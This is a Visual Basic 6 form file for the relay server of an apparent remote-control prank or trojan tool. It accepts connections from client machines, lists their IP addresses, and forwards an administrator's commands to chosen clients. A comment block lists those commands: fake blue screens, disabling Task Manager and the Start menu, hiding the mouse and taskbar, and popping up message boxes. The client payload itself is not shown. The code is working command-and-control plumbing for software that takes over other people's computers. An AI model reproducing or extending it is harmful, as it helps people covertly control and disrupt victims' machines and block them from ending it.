VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCN.OCX"
Begin VB.Form frmControlServer 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Server"
   ClientHeight    =   3030
   ClientLeft      =   16305
   ClientTop       =   11655
   ClientWidth     =   1965
   Icon            =   "frmControlServer.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Moveable        =   0   'False
   ScaleHeight     =   3030
   ScaleWidth      =   1965
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Visible         =   0   'False
   Begin MSWinsockLib.Winsock sckConnected 
      Index           =   0
      Left            =   240
      Top             =   2520
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   15676
   End
   Begin MSWinsockLib.Winsock sckListen 
      Left            =   360
      Top             =   1920
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   15675
   End
   Begin MSWinsockLib.Winsock sckControl 
      Left            =   360
      Top             =   1320
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      LocalPort       =   15674
   End
   Begin VB.ListBox lstIPs 
      Height          =   1620
      ItemData        =   "frmControlServer.frx":1002
      Left            =   240
      List            =   "frmControlServer.frx":1004
      TabIndex        =   2
      Top             =   1365
      Width           =   1575
   End
   Begin VB.Label lblControlStatus 
      Alignment       =   2  'Center
      Caption         =   "Control Status"
      Height          =   255
      Left            =   240
      TabIndex        =   3
      Top             =   120
      Width           =   1575
   End
   Begin VB.Label lblStatus 
      Alignment       =   2  'Center
      Caption         =   "Listening"
      BeginProperty Font 
         Name            =   "@Arial Unicode MS"
         Size            =   14.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   240
      TabIndex        =   0
      Top             =   360
      Width           =   1575
   End
   Begin VB.Label lblConnectedTo 
      Alignment       =   2  'Center
      Caption         =   "Connected To"
      Height          =   255
      Left            =   240
      TabIndex        =   1
      Top             =   960
      Width           =   1575
   End
   Begin VB.Menu mnuTray 
      Caption         =   "Popup"
      Visible         =   0   'False
      Begin VB.Menu mnuTrayRestore 
         Caption         =   "Restore"
      End
      Begin VB.Menu mnuTrayMinimize 
         Caption         =   "Minimize"
         Visible         =   0   'False
      End
      Begin VB.Menu mnuTraySep 
         Caption         =   "-"
      End
      Begin VB.Menu mnuTrayClose 
         Caption         =   "Close"
      End
   End
End
Attribute VB_Name = "frmControlServer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private intUsers As Integer
Private dblConnections As Double

'TO ADMINISTRATOR
', - Send Connections
'` - Show Reply Message Box

'FROM ADMINISTRATOR / TO CLIENT
'? - Stop connection to specified user

'# - Display Blue Screen
'$ - Hide Blue Screen
'% - Display Black Screen
'^ - Hide Black Screen

'! - Beep
'~ - Message Box
'@ - Reply Box

'& - Disable Task Manager
'* - Enable Task Manager
'( - Hide Mouse
') - Show Mouse
'| - Open Internet Explorer
'_ - Close Internet Explorer
'= - Disable Start Menu
'+ - Enable Start Menu
'[ - Hide Task Bar
'] - Show Task Bar




Private Sub mnuTrayClose_Click()
    Unload Me
End Sub

Private Sub mnuTrayMinimize_Click()
    Me.Visible = False
    mnuTrayRestore.Visible = True
    mnuTrayMinimize.Visible = False
End Sub

Private Sub mnuTrayRestore_Click()
    Me.Visible = True
    mnuTrayMinimize.Visible = True
    mnuTrayRestore.Visible = False
End Sub


Private Sub lblConnectedTo_Click()
mnuTrayMinimize_Click
End Sub

Private Sub lblControlStatus_Click()
mnuTrayMinimize_Click
End Sub

Private Sub lblStatus_Click()
mnuTrayMinimize_Click
End Sub

Private Sub lstIPs_Click()
mnuTrayMinimize_Click
End Sub







Private Sub Form_Load()
    AddToTray Me, mnuTray
    SetTrayTip "Controller Server"
    
    sckControl.LocalPort = 15674
    sckControl.Listen
    
    sckListen.LocalPort = 15675
    sckListen.Listen
    
    lblStatus.Caption = "Listening"
    frmControlServer.Caption = "Control Disconnected"
End Sub






Private Sub sckConnected_DataArrival(Index As Integer, ByVal bytesTotal As Long)
Dim strData As String
sckConnected(Index).GetData strData

sckControl.SendData strData
End Sub






'WINSOCK LISTEN --------------------------------------
Private Sub sckListen_ConnectionRequest(ByVal requestID As Long)
    Load sckConnected(sckConnected.Count)

    sckConnected(sckConnected.Count - 1).Accept requestID
    lstIPs.AddItem (sckConnected(sckConnected.Count - 1).RemoteHostIP) & " (" & dblConnections & ")"
    dblConnections = dblConnections + 1
    lstIPs.ItemData(lstIPs.ListCount - 1) = sckConnected.Count - 1
    
    Load frmPopup
    frmPopup.lblHappening.Caption = "New user " & lstIPs.List(lstIPs.ListCount - 1) & " connected"
    frmPopup.Visible = True
    frmPopup.tmrClose.Enabled = True
    
    If lblStatus.Caption = "Connected" Then
        sckControl.SendData "," & sckConnected(sckConnected.Count - 1).RemoteHostIP
    End If
    
End Sub






'WINSOCK CONTROL -------------------------------------
Private Sub sckControl_ConnectionRequest(ByVal requestID As Long)
    Dim intCount As Integer
    
    sckControl.Close
    sckControl.Accept (requestID)
    lblStatus.Caption = "Connected"
    frmControlServer.Caption = "Control Connected"
    
    Load frmPopup
    frmPopup.lblHappening.Caption = "Control User Connected"
    frmPopup.Visible = True
    frmPopup.tmrClose.Enabled = True
    
    For intCount = 0 To lstIPs.ListCount - 1
        lstIPs.Selected(intCount) = True
        sckControl.SendData "," & lstIPs.Text
    Next intCount
    
End Sub

Private Sub sckControl_DataArrival(ByVal bytesTotal As Long)
    Dim strData As String
    Dim strIP As String
    Dim intCount As Integer
    
    sckControl.GetData strData

'If Closing Connection
    If Mid(strData, 1, 1) = "?" Then
        strData = Right(strData, Len(strData) - 1)
        For intCount = 0 To lstIPs.ListCount - 1
            lstIPs.Selected(intCount) = True
            If lstIPs.Text = strData Then
                sckConnected(lstIPs.ItemData(intCount)).Close
                
                Load frmPopup
                frmPopup.lblHappening.Caption = "Connection to " & lstIPs.List(intCount) & " closed"
                frmPopup.Visible = True
                frmPopup.tmrClose.Enabled = True
                
                lstIPs.RemoveItem (intCount)
                GoTo NoAction
            End If
        Next intCount

    End If
    
    
'If doing another action
    intCount = 1
    Do Until Mid(strData, intCount, 1) = ":"
        strIP = strIP + Mid(strData, intCount, 1)
        intCount = intCount + 1
    Loop
    
    strData = Right(strData, Len(strData) - intCount)
    
    For intCount = 0 To lstIPs.ListCount
        lstIPs.Selected(intCount) = True
        If lstIPs.Text = strIP Then
            sckConnected(lstIPs.ItemData(intCount)).SendData strData
            GoTo NoAction
        End If
    Next intCount

NoAction:
End Sub

Private Sub sckControl_Close()
    sckControl.Close
    sckControl.Listen
    lblStatus.Caption = "Listening"
    frmControlServer.Caption = "Control Disconnected"

    Load frmPopup
    frmPopup.lblHappening.Caption = "Control User Disconnected"
    frmPopup.Visible = True
    frmPopup.tmrClose.Enabled = True
End Sub

Private Sub sckControl_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    sckControl.Close
    sckControl.Listen
    lblStatus.Caption = "Listening"
    frmControlServer.Caption = "Control Disconnected"
End Sub






Private Sub Form_Unload(Cancel As Integer)
    sckControl.Close
    RemoveFromTray
End Sub
